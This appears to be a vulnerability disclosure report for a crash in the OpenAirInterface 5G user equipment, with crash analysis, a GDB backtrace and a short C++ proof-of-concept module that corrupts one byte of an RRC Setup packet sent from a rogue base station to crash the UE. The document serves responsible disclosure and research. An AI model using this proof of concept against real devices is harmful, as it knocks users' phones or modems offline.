# mac_sch_16__BWP_Downlink_bwp_Common_reencoded_63_report
**Vulnerability Soucce Code**
https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/0afa3f3193f77ce718148ca48cbf18b321d1cf23/openair2/LAYER2/NR_MAC_COMMON/nr_mac_common.c#L3722

```
AssertFatal(l_prime>=0,"ERROR in configuration.Check Time Domain allocation of this Grant. l_prime < 1. row:%d, column:%d\n", row, column);
```

**Crash Context**  

In the 5G connection, the base station (sender) communicates with the user equipment (receiver), where the crash occurred on the user equipment. This crash took place during the RRC connection setup phase after the base station sent a tampered data packet. The backtrace reveals a `SIGABRT` error signal in the UEthread, with the primary function implicated being `fill_dmrs_mask` in the nr_mac_common.c file at line 3722

**1. Cause of Crash**
   - The function `fill_dmrs_mask` receives parameters such as `pdsch_Config`, `dmrs_TypeA_Position`, `NrOfSymbols`, `startSymbol`, `mappingtype`, and `length`. These parameters directly influence the configuration of the `DMRS` (Demodulation Reference Signal) mask, a critical component in handling downlink data. A malformed packet or invalid parameter values can lead to unexpected behavior in `fill_dmrs_mask`, potentially due to:
     - Out-of-range values or type mismatches.
     - Null or uninitialized pointers (e.g., `pdsch_Config`).
     - Unexpected values that violate assumptions in `nr_ue_process_dci` and related functions, triggering a `SIGABRT`.

**2. Vulnerability Potential**
   - **Memory Corruption**: The `fill_dmrs_mask` function could be susceptible to memory corruption if it does not handle out-of-bounds values properly. 
   - **Denial of Service (DoS)**: An attacker who can send malformed or unexpected data in RRC messages may repeatedly trigger this crash, causing the UE to repeatedly abort, thus leading to a Denial of Service (DoS).

**3. Exploitation Scenarios**
   - **Remote Trigger**: By crafting an RRC message with specific, malformed configurations (e.g., manipulating `NrOfSymbols`, `startSymbol`), an attacker could potentially cause memory corruption or crashes in UEs connected to a compromised gNB.
   - **Persistent UE Crash Loop**: If the vulnerability is exploited in an environment where the UE continually attempts reconnections, a persistent crash loop could occur, effectively rendering the UE unusable.

**Summary for CVE Submission**
The vulnerability appears to be triggered by malformed parameters in RRC messages, resulting in an unhandled exception in `fill_dmrs_mask`. This may be exploited to cause denial of service by repeated crashes or, potentially, memory corruption if further validation gaps are discovered. Additional research is needed to confirm exploitation potential, but this crash highlights a flaw in handling tampered packet inputs in RRC setup, affecting the UE’s stability and security.

**GDB Debug Information**
```console
Thread 13 "UEthread" received signal SIGABRT, Aborted.
[Switching to Thread 0x7a2574e00700 (LWP 42174)]
__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
51	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
(gdb) bt
#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
#1  0x00007a25857837f1 in __GI_abort () at abort.c:79
#2  0x00005e2e7c80fea0 in fill_dmrs_mask (pdsch_Config=0x1, dmrs_TypeA_Position=<optimized out>, NrOfSymbols=1, startSymbol=1, mappingtype=<optimized out>, length=1) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_COMMON/nr_mac_common.c:3722
#3  0x00005e2e7c927c83 in nr_ue_process_dci (module_id=<optimized out>, cc_id=<optimized out>, gNB_index=<optimized out>, frame=<optimized out>, slot=<optimized out>, dci=0x5e2e86471f20, dci_ind=0x7a2574d932b0) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_UE/nr_ue_procedures.c:1308
#4  0x00005e2e7c92b360 in nr_ue_process_dci_indication_pdu (module_id=<optimized out>, cc_id=<optimized out>, gNB_index=<optimized out>, frame=193, slot=14, dci=0x7a2574d932b0) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_UE/nr_ue_procedures.c:629
#5  0x00005e2e7c915cd8 in handle_dci (module_id=<optimized out>, cc_id=<optimized out>, gNB_index=<optimized out>, frame=<optimized out>, slot=<optimized out>, dci=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c:1068
#6  0x00005e2e7c9161e2 in nr_ue_dl_indication (dl_info=0x7a2574d93230, ul_time_alignment=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c:1168
#7  0x00005e2e7c830a1b in nr_ue_pdcch_procedures (ue=0x7a25879c9010, proc=<optimized out>, pdcch_est_size=<optimized out>, pdcch_dl_ch_estimates=<optimized out>, phy_data=<optimized out>, n_ss=<optimized out>, rxdataF=0x7a2574de79e0) at /home/user/wdissector/3rd-party/oai_5g_sa/openair1/SCHED_NR_UE/phy_procedures_nr_ue.c:542
#8  0x00005e2e7c835d1d in phy_procedures_nrUE_RX (ue=0x7a25879c9010, proc=<optimized out>, phy_data=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair1/SCHED_NR_UE/phy_procedures_nr_ue.c:1212
#9  0x00005e2e7c7ff128 in UE_processing (rxtxD=0x7a2574dff8b0) at /home/user/wdissector/3rd-party/oai_5g_sa/executables/nr-ue.c:622
#10 0x00005e2e7c800441 in UE_thread (arg=0x7a25879c9010) at /home/user/wdissector/3rd-party/oai_5g_sa/executables/nr-ue.c:911
#11 0x00007a258730e6db in start_thread (arg=0x7a2574e00700) at pthread_create.c:463
#12 0x00007a258586461f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
(gdb) 

```

**Malformed Packet Send From the Base Station**
![Malformed Packet](https://github.com/qiqingh/mac_sch_16__BWP_Downlink_bwp_Common_reencoded_63_report/blob/main/pcap.png)


**PoC Code**
The following PoC code generates a falsified packet sent from the Base Station (sender) to the User Equipment (receiver). Due to a vulnerability in the User Equipment, this packet causes the device to crash, resulting in a Denial of Service (DoS).

To compile and run this PoC code, you'll need the environment described here: https://github.com/asset-group/5ghoul-5g-nr-attacks?tab=readme-ov-file#4--create-your-own-5g-exploits-test-cases

```cpp
#include <ModulesInclude.hpp>

// Filters
wd_filter_t f1;

// Vars

const char *module_name()
{
    return "Mediatek";
}

// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;

    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");

    return 0;
}

// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);

    return 0;
}

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[146 - 48] = 0x80;
        return 1;
    }

    return 0;
}

```
logo
